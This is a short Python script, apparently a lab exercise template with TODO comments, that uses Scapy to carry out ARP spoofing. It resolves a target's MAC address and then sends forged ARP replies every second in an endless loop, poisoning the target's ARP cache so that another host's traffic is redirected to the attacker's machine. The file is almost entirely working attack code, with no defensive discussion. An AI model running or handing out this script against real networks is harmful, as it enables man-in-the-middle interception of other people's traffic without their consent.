from scapy.all import Ether, ARP, srp, send, get_if_list, get_if_hwaddr
from time import sleep
from sys import argv


def get_mac(IP):
    """
    Retrieve a MAC address from an IP address using ARP.

    This function sends an ARP request for a given IP address, attempting to
    retrieve the MAC address associated with that IP. It sends a broadcast
    (ff:ff:ff:ff:ff:ff) request asking who has the IP address specified.
    """
    # Prepare the packer (frame) with an ARP layer
    frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP)
    # Send the frame to layer 2
    answers = srp(frame, timeout=5, verbose=False)[0]
    try:
        return answers[0][1].hwsrc
    except Exception as e:
        print("No valid ARP reply was received from %s!" % IP)
        exit(1)


def main():
    IFACE = None
    # TODO: initialize TARGET1 variable and TARGET2 variable
    TARGET1 = None
    TARGET2 = None

    # Parameters check
    if len(argv) < 4:
        print("Usage : %s net_iface target1 target2" % argv[0])
        return 0

    if argv[1] not in get_if_list():
        print("Invalid network interface selected")
        return 1

    # TODO: update IFACE, TARGET1 (attacker) and TARGET2 (the target) variables
    IFACE, TARGET1, TARGET2 = (argv[1], argv[2], argv[3])

    # Retrieving necessary MAC addresses
    self_mac = get_if_hwaddr(IFACE)
    print("Retrieving target1 MAC from local IP ", TARGET1)
    target1_mac = get_mac(TARGET1)

    # Setting up spoofing
    spoofing = True
    frames_sent = 0

    # Infinite loop, each second a new ARP packet is sent
    while spoofing:
        packet = ARP(op=2, pdst=TARGET1, hwdst=target1_mac, psrc=TARGET2, hwsrc=self_mac)
        send(packet, verbose=False)
        frames_sent += 1
        print('Sent %s ARP frames' % frames_sent)
        sleep(1)
    return 0


if __name__ == "__main__":
    exit(main())
